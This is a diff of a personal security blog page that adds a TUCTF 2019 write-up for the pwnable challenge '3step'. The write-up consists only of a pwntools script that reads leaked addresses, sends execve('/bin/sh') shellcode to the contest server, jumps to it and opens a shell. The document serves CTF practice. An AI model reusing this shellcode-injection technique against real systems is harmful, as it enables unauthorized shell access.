@@ -28,10 +28,10 @@
   
     
   
-  <meta name="description" content="정보보호 컨설턴트">
+  <meta name="description" content="3step">
 
   
-  <link rel="alternate" hreflang="en-us" href="/tags/cq/">
+  <link rel="alternate" hreflang="en-us" href="/post/3step/">
 
   
 
@@ -109,15 +109,12 @@
   
 
   
-  <link rel="alternate" href="/tags/cq/index.xml" type="application/rss+xml" title="j3rrry">
-  <link rel="feed" href="/tags/cq/index.xml" type="application/rss+xml" title="j3rrry">
-  
 
   <link rel="manifest" href="/site.webmanifest">
   <link rel="icon" type="image/png" href="/img/icon.png">
   <link rel="apple-touch-icon" type="image/png" href="/img/icon-192.png">
 
-  <link rel="canonical" href="/tags/cq/">
+  <link rel="canonical" href="/post/3step/">
 
   
   
@@ -132,12 +129,14 @@
   <meta property="twitter:creator" content="@leunja">
   
   <meta property="og:site_name" content="j3rrry">
-  <meta property="og:url" content="/tags/cq/">
-  <meta property="og:title" content="CQ | j3rrry">
-  <meta property="og:description" content="정보보호 컨설턴트"><meta property="og:image" content="/img/icon-192.png">
+  <meta property="og:url" content="/post/3step/">
+  <meta property="og:title" content="TUCTF 2019 Pwnable 3step | j3rrry">
+  <meta property="og:description" content="3step"><meta property="og:image" content="/img/icon-192.png">
   <meta property="og:locale" content="en-us">
   
-  <meta property="og:updated_time" content="2019-03-01T16:35:28&#43;09:00">
+  <meta property="article:published_time" content="2019-12-03T03:33:19&#43;09:00">
+  
+  <meta property="article:modified_time" content="2019-12-03T03:33:19&#43;09:00">
   
 
   
@@ -149,7 +148,7 @@
 
 
 
-  <title>CQ | j3rrry</title>
+  <title>TUCTF 2019 Pwnable 3step | j3rrry</title>
 
 </head>
 
@@ -332,7 +331,7 @@
         
 
         <li class="nav-item">
-          <a class="nav-link  active" href="/cq/"><span>CQ-RankCalc</span></a>
+          <a class="nav-link " href="/cq/"><span>CQ-RankCalc</span></a>
         </li>
 
         
@@ -395,54 +394,343 @@
 </nav>
 
 
+  <article class="article" itemscope itemtype="http://schema.org/Article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+  
+  
+<div class="article-container pt-3">
+  <h1 itemprop="name">TUCTF 2019 Pwnable 3step</h1>
+
+  
+  <p class="page-subtitle">3step</p>
+  
+
+  
+    
+
+
+
+<meta content="2019-12-03 03:33:19 &#43;0900 KST" itemprop="datePublished">
+<meta content="2019-12-03 03:33:19 &#43;0900 KST" itemprop="dateModified">
+
+<div class="article-metadata">
+
+  
+  
+
+  
+  <span class="article-date">
+    
+    
+      
+    
+    <time>2019-12-03</time>
+  </span>
+  
+
+  
+
+  
+  <span class="middot-divider"></span>
+  <span class="article-reading-time">
+    1 min read
+  </span>
+  
+
+  
+  
+  <span class="middot-divider"></span>
+  <a href="/post/3step/#disqus_thread"></a>
+  
+
+  
+  
+
+  
+    
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
+    <li>
+      <a class="twitter"
+         href="https://twitter.com/intent/tweet?text=TUCTF%202019%20Pwnable%203step&amp;url=%2fpost%2f3step%2f"
+         target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+    </li>
+    <li>
+      <a class="facebook"
+         href="https://www.facebook.com/sharer.php?u=%2fpost%2f3step%2f"
+         target="_blank" rel="noopener">
+        <i class="fab fa-facebook-f"></i>
+      </a>
+    </li>
+    <li>
+      <a class="linkedin"
+         href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2fpost%2f3step%2f&amp;title=TUCTF%202019%20Pwnable%203step"
+         target="_blank" rel="noopener">
+        <i class="fab fa-linkedin-in"></i>
+      </a>
+    </li>
+    <li>
+      <a class="weibo"
+         href="http://service.weibo.com/share/share.php?url=%2fpost%2f3step%2f&amp;title=TUCTF%202019%20Pwnable%203step"
+         target="_blank" rel="noopener">
+        <i class="fab fa-weibo"></i>
+      </a>
+    </li>
+    <li>
+      <a class="email"
+         href="mailto:?subject=TUCTF%202019%20Pwnable%203step&amp;body=%2fpost%2f3step%2f">
+        <i class="fas fa-envelope"></i>
+      </a>
+    </li>
+  </ul>
+</div>
+
+
+  
+
+</div>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+</div>
+
+
+
+  <div class="article-container">
+
+    <div class="article-style" itemprop="articleBody">
+      <pre><code class="language-py">from pwn import *
+
+def start():
+    e = ELF('./3step')
+    r = remote('chal.tuctf.com', 30504)
+
+    return e, r
+
+def info():
+    r.recvuntil('0x')
+    bss = int(r.recvline(), 16)
+    stack = int(r.recvline(), 16)
+    log.info(hex(bss) + ' bss')
+    log.info(hex(stack) + ' stack')
+
+    return bss, stack
+
+def step1():
+    r.recvuntil(': ')
+    r.send('/bin/sh')
+
+def step2():
+    r.recvuntil(': ')
+    r.send(shellcode)
+
+def step3():
+    r.recvuntil(': ')
+    r.send(p32(stack))
+
+if __name__ == '__main__':
+    e, r = start()
+    bss, stack = info()
+
+    shellcode = '''
+        mov ebx, {}
+        xor ecx, ecx
+        xor edx, edx
+        xor eax, eax
+        mov al, 0xb
+        int 0x80
+        mov al, 0xb
+        int 0x80
+    '''.format(bss)
+    shellcode = asm(shellcode)
+
+    step1()
+    step2()
+    step3()
+
+    r.interactive()
+</code></pre>
+
+    </div>
+
+    
+
+
+
+    
+      
+
+
+
+
+
+
+
+
   
 
 
 
 
-
-
-
-
-
-
-
-
-  
 
   
   
   
     
   
-<div class="universal-wrapper pt-3">
-  <h1 itemprop="name">CQ</h1>
-
   
-
-  
-</div>
-
-
-
-<div class="universal-wrapper">
-  
-
-  
-  
-  <div>
-    <h2><a href="/cq/">CQ-RankCalc</a></h2>
-    <div class="article-style">
+  <div class="media author-card" itemscope itemtype="http://schema.org/Person">
+    
       
-      크퀘 랭크 퀘스트 계산기
-      
+      <img class="portrait mr-3" src="/authors/admin/avatar_hu411e86c0f781efe1eb89419db5a5ee89_120575_250x250_fill_q90_lanczos_center.jpg" itemprop="image" alt="Avatar">
+    
+
+    <div class="media-body">
+      <h5 class="card-title" itemprop="name"><a href="/">j3rrry</a></h5>
+      <h6 class="card-subtitle">정보보호 컨설턴트</h6>
+      <p class="card-text" itemprop="description">4년제 졸업했으며 취업연계 교육을 받았으며 CTF 참가하는 것을 좋아합니다.</p>
+      <ul class="network-icon" aria-hidden="true">
+        
+          
+          
+          
+            
+          
+          
+          
+          
+          
+            
+          
+          <li>
+            <a itemprop="sameAs" href="/#contact" >
+              <i class="fas fa-envelope"></i>
+            </a>
+          </li>
+        
+          
+          
+          
+            
+          
+          
+          
+          
+          
+            
+          
+          <li>
+            <a itemprop="sameAs" href="https://twitter.com/leunja" target="_blank" rel="noopener">
+              <i class="fab fa-twitter"></i>
+            </a>
+          </li>
+        
+          
+          
+          
+            
+          
+          
+          
+          
+          
+            
+          
+          <li>
+            <a itemprop="sameAs" href="https://fb.com/n3cin1" target="_blank" rel="noopener">
+              <i class="fab fa-facebook"></i>
+            </a>
+          </li>
+        
+          
+          
+          
+            
+          
+          
+          
+          
+          
+            
+          
+          <li>
+            <a itemprop="sameAs" href="https://github.com/j3rrry" target="_blank" rel="noopener">
+              <i class="fab fa-github"></i>
+            </a>
+          </li>
+        
+      </ul>
     </div>
   </div>
-  
 
-  
 
-</div>
+
+      
+      
+    
+
+    
+
+    
+<section id="comments">
+  <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "j3rrry" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+
+
+
+  </div>
+</article>
 
       
 
